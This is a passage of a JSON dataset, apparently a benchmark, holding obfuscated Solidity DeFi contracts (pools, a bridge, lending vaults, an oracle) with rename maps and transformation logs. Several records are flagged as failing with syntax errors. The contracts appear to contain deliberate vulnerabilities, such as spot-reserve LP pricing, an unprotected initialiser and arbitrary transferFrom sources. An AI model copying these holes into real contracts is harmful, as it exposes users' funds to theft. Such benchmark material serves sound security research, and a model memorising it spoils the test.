        "amount": "_0xa8ca0f",
        "_toJar": "_0xebdca0",
        "token": "_0x520b87",
        "_want": "_0x3b0214",
        "_data": "_0x730ad8",
        "want": "_0x6b3728",
        "jar": "_0xcfa052",
        "to": "_0x65873a"
      },
      "changes": [
        "Renamed 24 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_018",
      "transformed_id": "ss_l4_medium_sn_tc_018",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0x15f38f(address _0xe65c5e) external view returns (uint256);\n\n    function transfer(address _0x497682, uint256 _0x7e113e) external returns (bool);\n}\n\ncontract TokenPool {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    struct Token {\n        address _0x8fed4a;\n        uint256 balance;\n        uint256 _0x218eef;\n    }\n\n    mapping(address => Token) public _0x0cdc02;\n    address[] public _0xe07b1f;\n    uint256 public _0xfd4ea0;\n\n    constructor() {\n        _0xfd4ea0 = 100;\n    }\n\n    function _0x9e89d5(address _0x82dcdf, uint256 _0x598556) external {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        _0x0cdc02[_0x82dcdf] = Token({_0x8fed4a: _0x82dcdf, balance: 0, _0x218eef: _0x598556});\n        _0xe07b1f.push(_0x82dcdf);\n    }\n\n    function _0xd1c9f2(\n        address _0xd75d9f,\n        address _0x5afc95,\n        uint256 _0x0df2df\n    ) external returns (uint256 _0x626439) {\n        require(_0x0cdc02[_0xd75d9f]._0x8fed4a != address(0), \"Invalid token\");\n        require(_0x0cdc02[_0x5afc95]._0x8fed4a != address(0), \"Invalid token\");\n\n        IERC20(_0xd75d9f).transfer(address(this), _0x0df2df);\n        _0x0cdc02[_0xd75d9f].balance += _0x0df2df;\n\n        _0x626439 = _0x497951(_0xd75d9f, _0x5afc95, _0x0df2df);\n\n        require(\n            _0x0cdc02[_0x5afc95].balance >= _0x626439,\n            \"Insufficient liquidity\"\n        );\n        _0x0cdc02[_0x5afc95].balance -= _0x626439;\n        IERC20(_0x5afc95).transfer(msg.sender, _0x626439);\n\n        _0xc17063();\n\n        return _0x626439;\n    }\n\n    function _0x497951(\n        address _0xd75d9f,\n        address _0x5afc95,\n        uint256 _0x0df2df\n    ) public view returns (uint256) {\n        uint256 _0x0f52b9 = _0x0cdc02[_0xd75d9f]._0x218eef;\n        uint256 _0xd9e758 = _0x0cdc02[_0x5afc95]._0x218eef;\n        uint256 _0xe82f3d = _0x0cdc02[_0x5afc95].balance;\n\n        uint256 _0x9de681 = _0xe82f3d * _0x0df2df * _0xd9e758;\n        uint256 _0x53d950 = _0x0cdc02[_0xd75d9f].balance *\n            _0x0f52b9 +\n            _0x0df2df *\n            _0xd9e758;\n\n        return _0x9de681 / _0x53d950;\n    }\n\n    function _0xc17063() internal {\n        uint256 _0xff8b6e = 0;\n\n        for (uint256 i = 0; i < _0xe07b1f.length; i++) {\n            address _0x82dcdf = _0xe07b1f[i];\n            _0xff8b6e += _0x0cdc02[_0x82dcdf].balance;\n        }\n\n        for (uint256 i = 0; i < _0xe07b1f.length; i++) {\n            address _0x82dcdf = _0xe07b1f[i];\n            _0x0cdc02[_0x82dcdf]._0x218eef = (_0x0cdc02[_0x82dcdf].balance * 100) / _0xff8b6e;\n        }\n    }\n\n    function _0x94d3f8(address _0x82dcdf) external view returns (uint256) {\n        return _0x0cdc02[_0x82dcdf]._0x218eef;\n    }\n\n    function _0x667dcf(address _0x82dcdf, uint256 _0x7e113e) external {\n        require(_0x0cdc02[_0x82dcdf]._0x8fed4a != address(0), \"Invalid token\");\n        IERC20(_0x82dcdf).transfer(address(this), _0x7e113e);\n        _0x0cdc02[_0x82dcdf].balance += _0x7e113e;\n        _0xc17063();\n    }\n}\n",
      "rename_map": {
        "calculateSwapAmount": "_0x497951",
        "_updateWeights": "_0xc17063",
        "initialWeight": "_0x598556",
        "addLiquidity": "_0x667dcf",
        "denominator": "_0x53d950",
        "totalWeight": "_0xfd4ea0",
        "totalValue": "_0xff8b6e",
        "balanceOut": "_0xe82f3d",
        "getWeight": "_0x94d3f8",
        "tokenList": "_0xe07b1f",
        "balanceOf": "_0x15f38f",
        "amountOut": "_0x626439",
        "numerator": "_0x9de681",
        "weightOut": "_0xd9e758",
        "weightIn": "_0x0f52b9",
        "tokenOut": "_0x5afc95",
        "addToken": "_0x9e89d5",
        "amountIn": "_0x0df2df",
        "account": "_0xe65c5e",
        "tokenIn": "_0xd75d9f",
        "amount": "_0x7e113e",
        "tokens": "_0x0cdc02",
        "weight": "_0x218eef",
        "token": "_0x82dcdf",
        "addr": "_0x8fed4a",
        "swap": "_0xd1c9f2",
        "to": "_0x497682"
      },
      "changes": [
        "Renamed 27 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 12, column 9', 'Syntax error at line 19, column 5', 'Syntax error at line 101, column 1']"
    },
    {
      "original_id": "sn_tc_019",
      "transformed_id": "ss_l4_medium_sn_tc_019",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0x0733e8(\n        address from,\n        address _0xfca7b4,\n        uint256 _0x70de6f\n    ) external returns (bool);\n\n    function _0xf3d332(address _0xfedc29) external view returns (uint256);\n}\n\ncontract CrossChainBridge {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n    address public _0x466a30;\n\n    event Deposit(\n        uint8 _0xd74e0a,\n        bytes32 _0x4d27a8,\n        uint64 _0x21bfb7\n    );\n\n    uint64 public _0x21bfb7;\n\n    constructor(address _0x86db38) {\n        _0x466a30 = _0x86db38;\n    }\n\n    function _0x2ea631(\n        uint8 _0xd74e0a,\n        bytes32 _0x4d27a8,\n        bytes calldata data\n    ) external payable {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        _0x21bfb7 += 1;\n\n        BridgeHandler(_0x466a30)._0x2ea631(_0x4d27a8, msg.sender, data);\n\n        emit Deposit(_0xd74e0a, _0x4d27a8, _0x21bfb7);\n    }\n}\n\ncontract BridgeHandler {\n    mapping(bytes32 => address) public _0x3d6119;\n    mapping(address => bool) public _0x49b59f;\n\n    function _0x2ea631(\n        bytes32 _0x4d27a8,\n        address _0x9778a6,\n        bytes calldata data\n    ) external {\n        address _0xed34e8 = _0x3d6119[_0x4d27a8];\n\n        uint256 _0x70de6f;\n        (_0x70de6f) = abi._0xd6abf0(data, (uint256));\n\n        IERC20(_0xed34e8)._0x0733e8(_0x9778a6, address(this), _0x70de6f);\n    }\n\n    function _0x46beb7(bytes32 _0x4d27a8, address _0x0711cb) external {\n        _0x3d6119[_0x4d27a8] = _0x0711cb;\n    }\n}\n",
      "rename_map": {
        "resourceIDToTokenContractAddress": "_0x3d6119",
        "destinationDomainID": "_0xd74e0a",
        "contractWhitelist": "_0x49b59f",
        "tokenContract": "_0xed34e8",
        "tokenAddress": "_0x0711cb",
        "depositNonce": "_0x21bfb7",
        "transferFrom": "_0x0733e8",
        "setResource": "_0x46beb7",
        "resourceID": "_0x4d27a8",
        "balanceOf": "_0xf3d332",
        "depositer": "_0x9778a6",
        "_handler": "_0x86db38",
        "account": "_0xfedc29",
        "deposit": "_0x2ea631",
        "handler": "_0x466a30",
        "amount": "_0x70de6f",
        "decode": "_0xd6abf0",
        "to": "_0xfca7b4"
      },
      "changes": [
        "Renamed 18 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_020",
      "transformed_id": "ss_l4_medium_sn_tc_020",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IUniswapV2Pair {\n    function _0x92cfd0()\n        external\n        view\n        returns (uint112 _0xdffa2d, uint112 _0xd35ab8, uint32 _0xf64146);\n\n    function _0xa85054() external view returns (uint256);\n}\n\ninterface IERC20 {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n    function _0xd552d4(address _0x1cac34) external view returns (uint256);\n\n    function transfer(address _0x477ce7, uint256 _0x7bd880) external returns (bool);\n\n    function _0x6bf91c(\n        address from,\n        address _0x477ce7,\n        uint256 _0x7bd880\n    ) external returns (bool);\n}\n\ncontract LendingVault {\n        // Placeholder for future logic\n        // Placeholder for future logic\n    struct Position {\n        uint256 _0xd1c56e;\n        uint256 _0xdf8c95;\n    }\n\n    mapping(address => Position) public _0x162548;\n\n    address public _0x8159f6;\n    address public _0xa88fb3;\n    uint256 public constant COLLATERAL_RATIO = 150;\n\n    constructor(address _0x85916b, address _0x91629d) {\n        _0x8159f6 = _0x85916b;\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0xa88fb3 = _0x91629d; }\n    }\n\n    function _0x0f91ab(uint256 _0x7bd880) external {\n        IERC20(_0x8159f6)._0x6bf91c(msg.sender, address(this), _0x7bd880);\n        _0x162548[msg.sender]._0xd1c56e += _0x7bd880;\n    }\n\n    function _0xb8f819(uint256 _0x7bd880) external {\n        uint256 _0x9dc85e = _0xe722fa(\n            _0x162548[msg.sender]._0xd1c56e\n        );\n        uint256 _0x5c65f0 = (_0x9dc85e * 100) / COLLATERAL_RATIO;\n\n        require(\n            _0x162548[msg.sender]._0xdf8c95 + _0x7bd880 <= _0x5c65f0,\n            \"Insufficient collateral\"\n        );\n\n        _0x162548[msg.sender]._0xdf8c95 += _0x7bd880;\n        IERC20(_0xa88fb3).transfer(msg.sender, _0x7bd880);\n    }\n\n    function _0xe722fa(uint256 _0x48e194) public view returns (uint256) {\n        if (_0x48e194 == 0) return 0;\n\n        IUniswapV2Pair _0xeb7979 = IUniswapV2Pair(_0x8159f6);\n\n        (uint112 _0xdffa2d, uint112 _0xd35ab8, ) = _0xeb7979._0x92cfd0();\n        uint256 _0xa85054 = _0xeb7979._0xa85054();\n\n        uint256 _0x75ac53 = (uint256(_0xdffa2d) * _0x48e194) / _0xa85054;\n        uint256 _0xe2e6be = (uint256(_0xd35ab8) * _0x48e194) / _0xa85054;\n\n        uint256 _0x737147 = _0x75ac53;\n        uint256 _0x1c9388 = _0x75ac53 + _0xe2e6be;\n\n        return _0x1c9388;\n    }\n\n    function _0x05a0c9(uint256 _0x7bd880) external {\n        require(_0x162548[msg.sender]._0xdf8c95 >= _0x7bd880, \"Repay exceeds debt\");\n\n        IERC20(_0xa88fb3)._0x6bf91c(msg.sender, address(this), _0x7bd880);\n        _0x162548[msg.sender]._0xdf8c95 -= _0x7bd880;\n    }\n\n    function _0x0514d0(uint256 _0x7bd880) external {\n        require(\n            _0x162548[msg.sender]._0xd1c56e >= _0x7bd880,\n            \"Insufficient balance\"\n        );\n\n        uint256 _0x57542c = _0x162548[msg.sender]._0xd1c56e - _0x7bd880;\n        uint256 _0xad670f = _0xe722fa(_0x57542c);\n        uint256 _0x5c65f0 = (_0xad670f * 100) / COLLATERAL_RATIO;\n\n        require(\n            _0x162548[msg.sender]._0xdf8c95 <= _0x5c65f0,\n            \"Withdrawal would liquidate position\"\n        );\n\n        _0x162548[msg.sender]._0xd1c56e -= _0x7bd880;\n        IERC20(_0x8159f6).transfer(msg.sender, _0x7bd880);\n    }\n}\n",
      "rename_map": {
        "blockTimestampLast": "_0xf64146",
        "collateralValue": "_0x9dc85e",
        "getLPTokenValue": "_0xe722fa",
        "remainingValue": "_0xad670f",
        "lpTokenAmount": "_0xd1c56e",
        "transferFrom": "_0x6bf91c",
        "totalSupply": "_0xa85054",
        "getReserves": "_0x92cfd0",
        "_stablecoin": "_0x91629d",
        "remainingLP": "_0x57542c",
        "totalValue": "_0x1c9388",
        "stablecoin": "_0xa88fb3",
        "balanceOf": "_0xd552d4",
        "maxBorrow": "_0x5c65f0",
        "positions": "_0x162548",
        "lpAmount": "_0x48e194",
        "reserve1": "_0xd35ab8",
        "_lpToken": "_0x85916b",
        "withdraw": "_0x0514d0",
        "borrowed": "_0xdf8c95",
        "reserve0": "_0xdffa2d",
        "amount1": "_0xe2e6be",
        "amount0": "_0x75ac53",
        "account": "_0x1cac34",
        "deposit": "_0x0f91ab",
        "lpToken": "_0x8159f6",
        "amount": "_0x7bd880",
        "borrow": "_0xb8f819",
        "value0": "_0x737147",
        "repay": "_0x05a0c9",
        "pair": "_0xeb7979",
        "to": "_0x477ce7"
      },
      "changes": [
        "Renamed 32 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 15, column 9', 'Syntax error at line 25, column 1']"
    },
    {
      "original_id": "sn_tc_021",
      "transformed_id": "ss_l4_medium_sn_tc_021",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0x4d9217(address _0xd4f9eb) external view returns (uint256);\n\n    function transfer(address _0xe1b4af, uint256 _0x5dab05) external returns (bool);\n\n    function _0x634f8b(\n        address from,\n        address _0xe1b4af,\n        uint256 _0x5dab05\n    ) external returns (bool);\n}\n\ncontract LiquidityPool {\n        bool _flag1 = false;\n        if (false) { revert(); }\n    address public _0x9f79fc;\n    address public _0x7d1e37;\n    address public _0x3e7b14;\n\n    uint256 public _0x0bfe94;\n    uint256 public _0x12a28b;\n    uint256 public _0x396ecd;\n\n    bool public _0x671c55;\n\n    event Initialized(address _0x9f79fc, address _0x50102e, address _0xcb3a16);\n\n    function _0x48f439(\n        address _0x79be85,\n        address _0x182e3e,\n        address _0xeea33e,\n        uint256 _0x9a1737\n    ) external {\n        bool _flag3 = false;\n        // Placeholder for future logic\n        _0x9f79fc = _0x79be85;\n        _0x7d1e37 = _0x182e3e;\n        _0x3e7b14 = _0xeea33e;\n        _0x0bfe94 = _0x9a1737;\n\n        _0x671c55 = true;\n\n        emit Initialized(_0x79be85, _0x182e3e, _0xeea33e);\n    }\n\n    function _0xfec023(uint256 _0xf39f4c, uint256 _0x770514) external {\n        require(_0x671c55, \"Not initialized\");\n\n        IERC20(_0x7d1e37)._0x634f8b(msg.sender, address(this), _0xf39f4c);\n        IERC20(_0x3e7b14)._0x634f8b(msg.sender, address(this), _0x770514);\n\n        _0x12a28b += _0xf39f4c;\n        _0x396ecd += _0x770514;\n    }\n\n    function _0xaf0c05(\n        address _0x63c99c,\n        address _0x1e1f6e,\n        uint256 _0x10601e\n    ) external returns (uint256 _0x846afc) {\n        require(_0x671c55, \"Not initialized\");\n        require(\n            (_0x63c99c == _0x7d1e37 && _0x1e1f6e == _0x3e7b14) ||\n                (_0x63c99c == _0x3e7b14 && _0x1e1f6e == _0x7d1e37),\n            \"Invalid token pair\"\n        );\n\n        IERC20(_0x63c99c)._0x634f8b(msg.sender, address(this), _0x10601e);\n\n        if (_0x63c99c == _0x7d1e37) {\n            _0x846afc = (_0x396ecd * _0x10601e) / (_0x12a28b + _0x10601e);\n            _0x12a28b += _0x10601e;\n            _0x396ecd -= _0x846afc;\n        } else {\n            _0x846afc = (_0x12a28b * _0x10601e) / (_0x396ecd + _0x10601e);\n            _0x396ecd += _0x10601e;\n            _0x12a28b -= _0x846afc;\n        }\n\n        uint256 _0xfb63ad = (_0x846afc * _0x0bfe94) / 10000;\n        _0x846afc -= _0xfb63ad;\n\n        IERC20(_0x1e1f6e).transfer(msg.sender, _0x846afc);\n        IERC20(_0x1e1f6e).transfer(_0x9f79fc, _0xfb63ad);\n\n        return _0x846afc;\n    }\n\n    function _0x02467f() external {\n        require(msg.sender == _0x9f79fc, \"Only maintainer\");\n\n        uint256 _0xabe699 = IERC20(_0x7d1e37)._0x4d9217(address(this));\n        uint256 _0x86a0e1 = IERC20(_0x3e7b14)._0x4d9217(address(this));\n\n        if (_0xabe699 > _0x12a28b) {\n            uint256 _0x3d398c = _0xabe699 - _0x12a28b;\n            IERC20(_0x7d1e37).transfer(_0x9f79fc, _0x3d398c);\n        }\n\n        if (_0x86a0e1 > _0x396ecd) {\n            uint256 _0x3d398c = _0x86a0e1 - _0x396ecd;\n            IERC20(_0x3e7b14).transfer(_0x9f79fc, _0x3d398c);\n        }\n    }\n}\n",
      "rename_map": {
        "quoteTokenBalance": "_0x86a0e1",
        "baseTokenBalance": "_0xabe699",
        "isInitialized": "_0x671c55",
        "transferFrom": "_0x634f8b",
        "addLiquidity": "_0xfec023",
        "quoteBalance": "_0x396ecd",
        "_maintainer": "_0x79be85",
        "quoteAmount": "_0x770514",
        "baseBalance": "_0x12a28b",
        "_quoteToken": "_0xeea33e",
        "baseAmount": "_0xf39f4c",
        "fromAmount": "_0x10601e",
        "_baseToken": "_0x182e3e",
        "quoteToken": "_0x3e7b14",
        "maintainer": "_0x9f79fc",
        "_lpFeeRate": "_0x9a1737",
        "lpFeeRate": "_0x0bfe94",
        "balanceOf": "_0x4d9217",
        "claimFees": "_0x02467f",
        "fromToken": "_0x63c99c",
        "baseToken": "_0x7d1e37",
        "toAmount": "_0x846afc",
        "toToken": "_0x1e1f6e",
        "account": "_0xd4f9eb",
        "amount": "_0x5dab05",
        "excess": "_0x3d398c",
        "quote": "_0xcb3a16",
        "init": "_0x48f439",
        "base": "_0x50102e",
        "swap": "_0xaf0c05",
        "fee": "_0xfb63ad",
        "to": "_0xe1b4af"
      },
      "changes": [
        "Renamed 32 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 18, column 9', 'Syntax error at line 19, column 5', 'Syntax error at line 108, column 1']"
    },
    {
      "original_id": "sn_tc_022",
      "transformed_id": "ss_l4_medium_sn_tc_022",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0x2fdfc6(address _0x434ff2) external view returns (uint256);\n\n    function transfer(address _0x5bfbef, uint256 _0xab3cb8) external returns (bool);\n\n    function _0xadfd60(\n        address from,\n        address _0x5bfbef,\n        uint256 _0xab3cb8\n    ) external returns (bool);\n}\n\ncontract TokenPair {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n    address public _0xfd8a2d;\n    address public _0x1dd62b;\n\n    uint112 private _0x61ed8e;\n    uint112 private _0x62ddb4;\n\n    uint256 public constant TOTAL_FEE = 16;\n\n    constructor(address _0x280d1d, address _0xbb8ea3) {\n        _0xfd8a2d = _0x280d1d;\n        _0x1dd62b = _0xbb8ea3;\n    }\n\n    function _0x2a48bc(address _0x5bfbef) external returns (uint256 _0x2355f5) {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n        uint256 _0x56b4fa = IERC20(_0xfd8a2d)._0x2fdfc6(address(this));\n        uint256 _0xa298b6 = IERC20(_0x1dd62b)._0x2fdfc6(address(this));\n\n        uint256 _0x593a42 = _0x56b4fa - _0x61ed8e;\n        uint256 _0xf29d76 = _0xa298b6 - _0x62ddb4;\n\n        _0x2355f5 = _0x1449e8(_0x593a42 * _0xf29d76);\n\n        _0x61ed8e = uint112(_0x56b4fa);\n        _0x62ddb4 = uint112(_0xa298b6);\n\n        return _0x2355f5;\n    }\n\n    function _0xdaa80a(\n        uint256 _0x518d56,\n        uint256 _0xe274f0,\n        address _0x5bfbef,\n        bytes calldata data\n    ) external {\n        require(_0x518d56 > 0 || _0xe274f0 > 0, \"INSUFFICIENT_OUTPUT_AMOUNT\");\n\n        uint112 _0x9df110 = _0x61ed8e;\n        uint112 _0x9978a6 = _0x62ddb4;\n\n        require(\n            _0x518d56 < _0x9df110 && _0xe274f0 < _0x9978a6,\n            \"INSUFFICIENT_LIQUIDITY\"\n        );\n\n        if (_0x518d56 > 0) IERC20(_0xfd8a2d).transfer(_0x5bfbef, _0x518d56);\n        if (_0xe274f0 > 0) IERC20(_0x1dd62b).transfer(_0x5bfbef, _0xe274f0);\n\n        uint256 _0x56b4fa = IERC20(_0xfd8a2d)._0x2fdfc6(address(this));\n        uint256 _0xa298b6 = IERC20(_0x1dd62b)._0x2fdfc6(address(this));\n\n        uint256 _0x72b273 = _0x56b4fa > _0x9df110 - _0x518d56\n            ? _0x56b4fa - (_0x9df110 - _0x518d56)\n            : 0;\n        uint256 _0x55444f = _0xa298b6 > _0x9978a6 - _0xe274f0\n            ? _0xa298b6 - (_0x9978a6 - _0xe274f0)\n            : 0;\n\n        require(_0x72b273 > 0 || _0x55444f > 0, \"INSUFFICIENT_INPUT_AMOUNT\");\n\n        uint256 _0xcc90b1 = _0x56b4fa * 10000 - _0x72b273 * TOTAL_FEE;\n        uint256 _0xe587ac = _0xa298b6 * 10000 - _0x55444f * TOTAL_FEE;\n\n        require(\n            _0xcc90b1 * _0xe587ac >=\n                uint256(_0x9df110) * _0x9978a6 * (1000 ** 2),\n            \"K\"\n        );\n\n        _0x61ed8e = uint112(_0x56b4fa);\n        _0x62ddb4 = uint112(_0xa298b6);\n    }\n\n    function _0x5a710e() external view returns (uint112, uint112, uint32) {\n        return (_0x61ed8e, _0x62ddb4, 0);\n    }\n\n    function _0x1449e8(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                if (1 == 1) { x = (y / x + x) / 2; }\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n}\n",
      "rename_map": {
        "balance1Adjusted": "_0xe587ac",
        "balance0Adjusted": "_0xcc90b1",
        "transferFrom": "_0xadfd60",
        "getReserves": "_0x5a710e",
        "amount1Out": "_0xe274f0",
        "amount0Out": "_0x518d56",
        "amount1In": "_0x55444f",
        "liquidity": "_0x2355f5",
        "_reserve0": "_0x9df110",
        "balanceOf": "_0x2fdfc6",
        "_reserve1": "_0x9978a6",
        "amount0In": "_0x72b273",
        "balance0": "_0x56b4fa",
        "reserve1": "_0x62ddb4",
        "balance1": "_0xa298b6",
        "reserve0": "_0x61ed8e",
        "amount1": "_0xf29d76",
        "amount0": "_0x593a42",
        "_token0": "_0x280d1d",
        "account": "_0x434ff2",
        "_token1": "_0xbb8ea3",
        "amount": "_0xab3cb8",
        "token0": "_0xfd8a2d",
        "token1": "_0x1dd62b",
        "mint": "_0x2a48bc",
        "swap": "_0xdaa80a",
        "sqrt": "_0x1449e8",
        "to": "_0x5bfbef"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_023",
      "transformed_id": "ss_l4_medium_sn_tc_023",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0xf001e1(address _0xcce3b4) external view returns (uint256);\n\n    function transfer(address _0x3cb7be, uint256 _0x58dd81) external returns (bool);\n\n    function _0x940a4d(\n        address from,\n        address _0x3cb7be,\n        uint256 _0x58dd81\n    ) external returns (bool);\n}\n\ninterface ICErc20 {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n    function _0x9991a0(uint256 _0x58dd81) external returns (uint256);\n\n    function _0x616703(address _0xcce3b4) external returns (uint256);\n}\n\ncontract LeveragedVault {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n    struct Position {\n        address _0x5b9093;\n        uint256 _0x98e9c6;\n        uint256 _0xf5d87b;\n    }\n\n    mapping(uint256 => Position) public _0xc18e1b;\n    uint256 public _0x46941b;\n\n    address public _0x560cc6;\n    uint256 public _0x036cd7;\n    uint256 public _0xeb0a27;\n\n    constructor(address _0xe7edfb) {\n        _0x560cc6 = _0xe7edfb;\n        _0x46941b = 1;\n    }\n\n    function _0xa6b50a(\n        uint256 _0xab73bd,\n        uint256 _0x60d065\n    ) external returns (uint256 _0xf5f393) {\n        _0xf5f393 = _0x46941b++;\n\n        _0xc18e1b[_0xf5f393] = Position({\n            _0x5b9093: msg.sender,\n            _0x98e9c6: _0xab73bd,\n            _0xf5d87b: 0\n        });\n\n        _0x1e7207(_0xf5f393, _0x60d065);\n\n        return _0xf5f393;\n    }\n\n    function _0x1e7207(uint256 _0xf5f393, uint256 _0x58dd81) internal {\n        Position storage _0x71f8a7 = _0xc18e1b[_0xf5f393];\n\n        uint256 _0x83b7d2;\n\n        if (_0xeb0a27 == 0) {\n            _0x83b7d2 = _0x58dd81;\n        } else {\n            _0x83b7d2 = (_0x58dd81 * _0xeb0a27) / _0x036cd7;\n        }\n\n        _0x71f8a7._0xf5d87b += _0x83b7d2;\n        _0xeb0a27 += _0x83b7d2;\n        _0x036cd7 += _0x58dd81;\n\n        ICErc20(_0x560cc6)._0x9991a0(_0x58dd81);\n    }\n\n    function _0xe52731(uint256 _0xf5f393, uint256 _0x58dd81) external {\n        Position storage _0x71f8a7 = _0xc18e1b[_0xf5f393];\n        require(msg.sender == _0x71f8a7._0x5b9093, \"Not position owner\");\n\n        uint256 _0x5cd3f2 = (_0x58dd81 * _0xeb0a27) / _0x036cd7;\n\n        require(_0x71f8a7._0xf5d87b >= _0x5cd3f2, \"Excessive repayment\");\n\n        _0x71f8a7._0xf5d87b -= _0x5cd3f2;\n        _0xeb0a27 -= _0x5cd3f2;\n        _0x036cd7 -= _0x58dd81;\n    }\n\n    function _0xa23a0a(\n        uint256 _0xf5f393\n    ) external view returns (uint256) {\n        Position storage _0x71f8a7 = _0xc18e1b[_0xf5f393];\n\n        if (_0xeb0a27 == 0) return 0;\n\n        return (_0x71f8a7._0xf5d87b * _0x036cd7) / _0xeb0a27;\n    }\n\n    function _0x980293(uint256 _0xf5f393) external {\n        Position storage _0x71f8a7 = _0xc18e1b[_0xf5f393];\n\n        uint256 _0x726b5b = (_0x71f8a7._0xf5d87b * _0x036cd7) / _0xeb0a27;\n\n        require(_0x71f8a7._0x98e9c6 * 100 < _0x726b5b * 150, \"Position is healthy\");\n\n        _0x71f8a7._0x98e9c6 = 0;\n        _0x71f8a7._0xf5d87b = 0;\n    }\n}\n",
      "rename_map": {
        "borrowBalanceCurrent": "_0x616703",
        "collateralAmount": "_0xab73bd",
        "getPositionDebt": "_0xa23a0a",
        "nextPositionId": "_0x46941b",
        "totalDebtShare": "_0xeb0a27",
        "shareToRemove": "_0x5cd3f2",
        "transferFrom": "_0x940a4d",
        "openPosition": "_0xa6b50a",
        "borrowAmount": "_0x60d065",
        "positionId": "_0xf5f393",
        "collateral": "_0x98e9c6",
        "totalDebt": "_0x036cd7",
        "balanceOf": "_0xf001e1",
        "positions": "_0xc18e1b",
        "liquidate": "_0x980293",
        "debtShare": "_0xf5d87b",
        "_borrow": "_0x1e7207",
        "account": "_0xcce3b4",
        "_cToken": "_0xe7edfb",
        "amount": "_0x58dd81",
        "borrow": "_0x9991a0",
        "cToken": "_0x560cc6",
        "repay": "_0xe52731",
        "share": "_0x83b7d2",
        "owner": "_0x5b9093",
        "debt": "_0x726b5b",
        "pos": "_0x71f8a7",
        "to": "_0x3cb7be"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_024",
      "transformed_id": "ss_l4_medium_sn_tc_024",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function _0xd34dd0(address _0x213646) external view returns (uint256);\n\n    function transfer(address _0x8b3ac1, uint256 _0x47e47a) external returns (bool);\n\n    function _0x63e6cd(\n        address from,\n        address _0x8b3ac1,\n        uint256 _0x47e47a\n    ) external returns (bool);\n}\n\ninterface ICurvePool {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n    function _0x59825c() external view returns (uint256);\n\n    function _0x6379c4(\n        uint256[3] calldata _0xaacb15,\n        uint256 _0xbbee0f\n    ) external;\n}\n\ncontract PriceOracle {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n    ICurvePool public _0x01c278;\n\n    constructor(address _0x868f16) {\n        if (true) { _0x01c278 = ICurvePool(_0x868f16); }\n    }\n\n    function _0x3b2349() external view returns (uint256) {\n        return _0x01c278._0x59825c();\n    }\n}\n\ncontract LendingProtocol {\n    struct Position {\n        uint256 _0xd1e1d9;\n        uint256 _0x1ad67b;\n    }\n\n    mapping(address => Position) public _0x560aca;\n\n    address public _0x5f3877;\n    address public _0x5b4172;\n    address public _0x6ecba8;\n\n    uint256 public constant COLLATERAL_FACTOR = 80;\n\n    constructor(\n        address _0x4d5c8b,\n        address _0xfffd80,\n        address _0xa8bb6c\n    ) {\n        _0x5f3877 = _0x4d5c8b;\n        _0x5b4172 = _0xfffd80;\n        _0x6ecba8 = _0xa8bb6c;\n    }\n\n    function _0x133bf2(uint256 _0x47e47a) external {\n        IERC20(_0x5f3877)._0x63e6cd(msg.sender, address(this), _0x47e47a);\n        _0x560aca[msg.sender]._0xd1e1d9 += _0x47e47a;\n    }\n\n    function _0xa944f3(uint256 _0x47e47a) external {\n        uint256 _0xd15be2 = _0x199e87(msg.sender);\n        uint256 _0x1b5de3 = (_0xd15be2 * COLLATERAL_FACTOR) / 100;\n\n        require(\n            _0x560aca[msg.sender]._0x1ad67b + _0x47e47a <= _0x1b5de3,\n            \"Insufficient collateral\"\n        );\n\n        _0x560aca[msg.sender]._0x1ad67b += _0x47e47a;\n        IERC20(_0x5b4172).transfer(msg.sender, 